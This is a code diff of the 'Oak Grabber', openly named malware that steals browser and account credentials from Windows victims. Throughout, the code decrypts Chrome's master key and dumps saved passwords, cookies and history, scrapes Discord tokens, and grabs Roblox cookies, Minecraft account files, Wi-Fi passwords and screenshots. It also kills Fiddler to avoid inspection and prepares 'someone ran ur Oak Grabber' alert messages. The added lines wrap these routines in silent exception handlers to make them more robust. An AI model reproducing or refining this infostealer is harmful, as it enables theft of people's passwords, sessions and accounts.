@@ -39,6 +39,7 @@ def getUser():
     return os.path.split(os.path.expanduser('~'))[-1]
 
 def getLocations():
+ try:
     if os.name == 'nt':
         locations = [
             f'{os.getenv("APPDATA")}\\.minecraft\\launcher_accounts.json',
@@ -53,7 +54,10 @@ def getLocations():
             f'Apps\\com.mojang.minecraftpe\\Documents\\games\\com.mojang\\'
         ]
         return locations
+ except:
+        pass
 def get_master_key():
+    try:
         with open(appdata + '\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
             local_state = f.read()
         local_state = json.loads(local_state)
@@ -61,6 +65,8 @@ def get_master_key():
         master_key = master_key[5:]
         master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
         return master_key
+    except:
+        pass
 masterkey = get_master_key()
 def decrypt_val(buff, master_key) -> str:
     try:
@@ -81,6 +87,7 @@ def decrypt_password(buff, master_key):
         except:
             return "Chrome < 80"
 def find_tokens(path):
+ try:
     dctokens = ""
     path += '\\Local Storage\\leveldb'
     for file_name in os.listdir(path):
@@ -92,14 +99,16 @@ def find_tokens(path):
                 for token in re.findall(regex, line):
                     checked.append(token)
                     dctokens+=(f"{token} \n\n")
-
     return checked
+ except:
+    pass
 def killfiddler():
     for proc in psutil.process_iter():
         if proc.name() == "Fiddler.exe":
             proc.kill()
 threading.Thread(target=killfiddler).start()
 def main():
+    sessionType = "N/A"
     for location in getLocations():
      if os.path.exists(location):
             auth_db = json.loads(open(location).read())['accounts']
@@ -113,6 +122,10 @@ def main():
                     accounts.append([username, sessionType, email, sessionKey])
     fr = []
     count = 0
+    McToken = "N/A"
+    McUsername ="N/A"
+    McUser ="N/A"
+    McToken = "N/A"
     for account in accounts:
         if '@' in account[2]:
             name = 'Email Address'
@@ -154,7 +167,8 @@ def main():
     Oakname = socket.gethostname()
     pc_username = os.getenv("UserName")
     checked = []
-    chrome_user_data = ntpath.join(appdata, 'Google', 'Chrome', 'User Data')
+    try:chrome_user_data = ntpath.join(appdata, 'Google', 'Chrome', 'User Data')
+    except:pass
     default_paths = {
             'Discord': roaming + '\\discord',
             'Discord Canary': roaming + '\\discordcanary',
@@ -192,7 +206,9 @@ def main():
      message = '@everyone **someone ran ur Oak Grabber**'
     else:
      message = '**someone ran ur Oak Grabber**'
-    for platforrm, path in default_paths.items():
+    embedMsg = '''**someone ran ur Oak Grabber <:wiseoaktree:1035527213543596062>**\n\n```No tokens found.```'''
+    try:
+     for platforrm, path in default_paths.items():
         dctokens = ""
         if not os.path.exists(path):
             continue
@@ -206,7 +222,8 @@ def main():
                 embedMsg = f"""**someone ran ur Oak Grabber <:wiseoaktree:1035527213543596062>**\n\n**Tokens:** ```{dctokens}```"""
         else:
             embedMsg = '''**someone ran ur Oak Grabber <:wiseoaktree:1035527213543596062>**\n\n```No tokens found.```'''
-
+    except:
+      pass
 
 
 
@@ -252,6 +269,7 @@ def main():
     try: mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
     except: mac = 'N/A'
     def cookies():
+     try:
         with open(".\\google-cookies.txt", "w", encoding="utf-8") as f:
             f.write("Google Chrome Cookies | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n")
 
@@ -271,7 +289,10 @@ def main():
                 cursor.close()
                 conn.close()
                 os.remove("Cookievault.db")
+     except:
+        pass
     def passwords():
+     try:
         google_pass = ".\\google-passwords.txt"
         with open(google_pass, "w", encoding="utf-8") as f:
             f.write(f"Google Chrome Passwords | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n")
@@ -291,7 +312,10 @@ def main():
                 cursor.close()
                 conn.close()
                 os.remove("Loginvault.db")
+     except:
+        pass
     def history():
+     try:
         google_history = ".\\google-history.txt"
         with open(google_history, "w", encoding="utf-8") as f:
             f.write(f"Google Chrome history | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n")
@@ -316,6 +340,8 @@ def main():
                 cursor.close()
                 conn.close()
                 os.remove("Historyvault.db")
+     except:
+        pass
     def sysinfo():
         tree = fr'''System Info  | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber
 HWID: {hardwareid}
@@ -381,6 +407,7 @@ Processes running
          with open("robloxcookies.txt", "w") as fs:
           fs.write(f"Roblox cookies | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n{c}\n{c2}\n{c3}\n{c4}\n{c5}\n{c6}")
     def wifistealer():
+     try:
         data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
         profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
         w = ("wifi passwords | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\nWi-Fi Name                    | Password")
@@ -394,10 +421,16 @@ Processes running
            t = ("{:<30}| {:<}]".format(i,""))
         with open("wifistealer.txt",'w') as ws:
            ws.write(f"{w}\n{o}\n{t}")
+     except:
+        pass
     def screenshot():
+     try:
         ss = ImageGrab.grab()
         ss.save(f'screenshot.png')
+     except:
+        pass
     def mc():
+     try:
         minecraft = ntpath.join(wiseoaktree, 'Minecraft')
         smh = os.makedirs(minecraft, exist_ok=True)
         mc = ntpath.join(roaming, '.minecraft')
@@ -405,6 +438,8 @@ Processes running
         for smh in to_grab:
             if ntpath.exists(ntpath.join(mc, smh)):
                 shutil.copy2(ntpath.join(mc, smh), minecraft)
+     except:
+        pass
     def discordinfo():
         info = ""
         for token in checked:
